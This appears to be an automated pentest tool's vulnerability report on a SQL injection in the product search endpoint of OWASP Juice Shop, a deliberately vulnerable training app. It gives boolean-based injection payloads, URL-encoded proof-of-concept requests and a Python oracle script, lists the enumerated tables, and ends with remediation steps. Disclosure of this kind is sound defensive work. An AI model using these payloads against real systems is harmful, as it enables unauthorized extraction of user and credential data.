╭─ VULN-0005 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: SQL Injection in Product Search Parameter (q) Enables Database       │
│  Enumeration                                                                 │
│                                                                              │
│  Severity: CRITICAL                                                          │
│                                                                              │
│  CVSS Score: 10.0                                                            │
│                                                                              │
│  Target: http://juiceshop:3000                                               │
│                                                                              │
│  Endpoint: /rest/products/search                                             │
│                                                                              │
│  Method: GET                                                                 │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H                            │
│                                                                              │
│  Description                                                                 │
│  A SQL injection vulnerability was identified in the product search          │
│  endpoint. The application incorporates the user-controlled query parameter  │
│  `q` into a backend SQL query without adequate parameterization/escaping.    │
│  By injecting additional boolean expressions, an unauthenticated attacker    │
│  can control the query logic and use the endpoint response as an oracle to   │
│  infer database information. Automated validation confirmed SQLite-specific  │
│  behavior and enabled database metadata extraction.                          │
│                                                                              │
│  Impact                                                                      │
│  An unauthenticated attacker can exploit the injection to enumerate and      │
│  extract database contents, including sensitive tables (e.g., user records)  │
│  depending on deployment data. SQL injection can also enable unauthorized    │
│  modification or deletion of data where write primitives are reachable       │
│  through the same database access context, and can facilitate further        │
│  compromise by enabling credential harvesting and privilege escalation       │
│  chains.                                                                     │
│                                                                              │
│  Technical Analysis                                                          │
│  The endpoint `GET /rest/products/search` accepts a `q` parameter that is    │
│  used to filter products. By supplying a crafted value that closes the       │
│  search string context and appends additional SQL conditions, the attacker   │
│  can cause predictable differences in the JSON response.                     │
│                                                                              │
│  A reliable boolean-based oracle was confirmed:                              │
│                                                                              │
│  A) TRUE condition returns at least one product result:                      │
│  `q=test%' AND 1=1 AND 'a%'='a`                                              │
│                                                                              │
│  B) FALSE condition returns an empty result set:                             │
│  `q=test%' AND 1=2 AND 'a%'='a`                                              │
│                                                                              │
│  These requests differ only in the boolean predicate (`1=1` vs `1=2`) and    │
│  produce materially different responses, indicating SQL injection. Further   │
│  automated exploitation confirmed SQLite as the backend DBMS and extracted   │
│  `sqlite_version()` as `3.44.2`, along with enumeration of common            │
│  application tables (e.g., `Users`, `Products`, `BasketItems`, `Feedbacks`,  │
│  `Complaints`, `SecurityQuestions`, `SecurityAnswers`, `Wallets`).           │
│                                                                              │
│  PoC Description                                                             │
│  1) Send a request that injects a TRUE predicate into `q`:                   │
│  `GET                                                                        │
│  http://juiceshop:3000/rest/products/search?q=test%25%27%20AND%201%3D1%20AN  │
│  D%20%27a%25%27%3D%27a`                                                      │
│                                                                              │
│  Observe `status":"success"` and a non-empty `data` array.                   │
│                                                                              │
│  2) Send the same request but with a FALSE predicate:                        │
│  `GET                                                                        │
│  http://juiceshop:3000/rest/products/search?q=test%25%27%20AND%201%3D2%20AN  │
│  D%20%27a%25%27%3D%27a`                                                      │
│                                                                              │
│  Observe `status":"success"` and an empty `data` array.                      │
│                                                                              │
│  3) (Metadata confirmation) Use the injection as an oracle to verify the     │
│  SQLite version value extracted via automated exploitation:                  │
│  Send:                                                                       │
│  `q=test%' AND sqlite_version()='3.44.2' AND 'a%'='a`                        │
│  and confirm results are returned, then change the version string (e.g.,     │
│  `0.0.0`) and confirm results are not returned.                              │
│                                                                              │
│  PoC Code                                                                    │
│  import sys                                                                  │
│  import requests                                                             │
│  from urllib.parse import quote                                              │
│                                                                              │
│  BASE = "http://juiceshop:3000"                                              │
│  ENDPOINT = f"{BASE}/rest/products/search"                                   │
│                                                                              │
│  def do_search(q: str):                                                      │
│      r = requests.get(ENDPOINT, params={"q": q}, headers={"Accept":          │
│  "application/json"}, timeout=10)                                            │
│      r.raise_for_status()                                                    │
│      j = r.json()                                                            │
│      count = len(j.get("data", [])) if isinstance(j, dict) else -1           │
│      return r.status_code, count, j                                          │
│                                                                              │
│  def main():                                                                 │
│      true_payload = "test%' AND 1=1 AND 'a%'='a"                             │
│      false_payload = "test%' AND 1=2 AND 'a%'='a"                            │
│                                                                              │
│      st_t, cnt_t, _ = do_search(true_payload)                                │
│      st_f, cnt_f, _ = do_search(false_payload)                               │
│                                                                              │
│      print("Boolean oracle:")                                                │
│      print(f"  TRUE  status={st_t} results={cnt_t} payload={true_payload}")  │
│      print(f"  FALSE status={st_f} results={cnt_f}                           │
│  payload={false_payload}")                                                   │
│                                                                              │
│      if cnt_t <= 0 or cnt_f != 0:                                            │
│          print("Oracle did not behave as expected; check                     │
│  connectivity/response parsing.")                                            │
│          return 2                                                            │
│                                                                              │
│      # Metadata validation (verifies a concrete DB value via the same        │
│  oracle)                                                                     │
│      version = "3.44.2"                                                      │
│      meta_true = f"test%' AND sqlite_version()='{version}' AND 'a%'='a"      │
│      meta_false = "test%' AND sqlite_version()='0.0.0' AND 'a%'='a"          │
│                                                                              │
│      _, cnt_mt, _ = do_search(meta_true)                                     │
│      _, cnt_mf, _ = do_search(meta_false)                                    │
│                                                                              │
│      print()                                                                 │
│      print("SQLite version verification via injection oracle:")              │
│      print(f"  sqlite_version() == {version} -> results={cnt_mt}")           │
│      print(f"  sqlite_version() == 0.0.0   -> results={cnt_mf}")             │
│                                                                              │
│      return 0                                                                │
│                                                                              │
│  if __name__ == '__main__':                                                  │
│      raise SystemExit(main())                                                │
│                                                                              │
│  Remediation                                                                 │
│  Implement robust SQL injection defenses:                                    │
│  1) Use parameterized queries/prepared statements for all database           │
│  interactions involving `q` (and any other user input). Avoid string         │
│  concatenation in WHERE/LIMIT/ORDER BY clauses.                              │
│  2) If using an ORM, remove raw query fragments and use safe query-builder   │
│  APIs (e.g., bound parameters for LIKE patterns).                            │
│  3) Apply input validation appropriate to the feature (e.g., length limits,  │
│  character allowlists), but treat validation as defense-in-depth only.       │
│  4) Add centralized error handling to avoid leaking query execution          │
│  details, and implement security tests (unit/integration) that assert        │
│  injected predicates do not alter results.                                   │
│  5) Deploy least-privilege for the database account used by the application  │
│  to reduce blast radius if injection recurs.                                 │
│                                                                              │
